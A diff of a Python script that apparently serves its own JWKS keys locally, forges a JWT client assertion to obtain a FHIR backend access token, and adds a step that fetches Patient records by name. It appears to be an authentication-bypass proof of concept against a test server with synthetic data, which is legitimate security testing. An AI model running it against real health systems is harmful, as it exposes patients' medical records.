@@ -64,7 +64,8 @@ thread.start()
 print("[+] Started local JWKS server on http://127.0.0.1:8081/jwks.json")
 
 # 2. Setup JWT claims
-client_id = "unknown_client"
+# 2. Setup JWT claims
+client_id = "73582bd3-d1ab-4817-b124-a013b0e835df"
 token_endpoint = "https://digressingly-auriferous-lee.ngrok-free.dev/fhir/auth/token"
 
 headers = {
@@ -96,16 +97,29 @@ data = {
     "grant_type": "client_credentials",
     "client_assertion_type": "urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
     "client_assertion": client_assertion,
-    "scope": "system/*.read"
+    "scope": "system/*.rs"
 }
 
 print(f"[*] Sending token request to {token_endpoint}")
 res = requests.post(token_endpoint, data=data, verify=False)
 
-print(f"Status Code: {res.status_code}")
+print(f"Token Status Code: {res.status_code}")
 try:
-    print(json.dumps(res.json(), indent=2))
-except:
+    token_resp = res.json()
+    print(json.dumps(token_resp, indent=2))
+    access_token = token_resp.get("access_token")
+    if access_token:
+        patient_url = "https://digressingly-auriferous-lee.ngrok-free.dev/fhir/Patient?name=Bosco882"
+        print(f"[*] Making GET request to {patient_url}")
+        res_patient = requests.get(patient_url, headers={"Authorization": f"Bearer {access_token}"}, verify=False)
+        print(f"Patient Status Code: {res_patient.status_code}")
+        try:
+            print(json.dumps(res_patient.json(), indent=2))
+        except:
+            print(res_patient.text)
+except Exception as e:
+    print(e)
     print(res.text)
 
 httpd.shutdown()
+
